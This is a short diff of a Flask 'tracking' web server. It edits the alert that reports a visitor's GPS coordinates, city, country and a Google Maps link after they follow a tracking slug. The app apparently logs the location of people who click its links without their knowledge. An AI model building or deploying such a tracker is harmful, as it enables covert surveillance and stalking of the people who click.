@@ -1,4 +1,4 @@
-# app.py - Web server for tracking with MAPS!
+# app.py - Web server for tracking
 from flask import Flask, request, redirect
 import requests
 import os
@@ -47,19 +47,11 @@ def track_redirect(slug):
             maps_link = f"https://www.google.com/maps?q={lat},{lon}&z=15"
             
             message = f"""
-📍 <b>🎯 EXACT LOCATION DETECTED!</b>
+📍 <b>🎯 LOCATION DETECTED!</b>
 ━━━━━━━━━━━━━━━━━━━
-🔗 Link: {slug}
-
-📌 <b>GPS Coordinates:</b>
-   Latitude: <code>{lat}</code>
-   Longitude: <code>{lon}</code>
-
+📌 GPS: {lat}, {lon}
 📍 {location.get('city', 'Unknown')}, {location.get('country', 'Unknown')}
-ISP: {location.get('isp', 'Unknown')}
-
-🗺️ <a href="{maps_link}">📍 Click to view on Google Maps</a>
-
+🗺️ <a href="{maps_link}">Click for Google Maps</a>
 🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 ━━━━━━━━━━━━━━━━━━━
 """
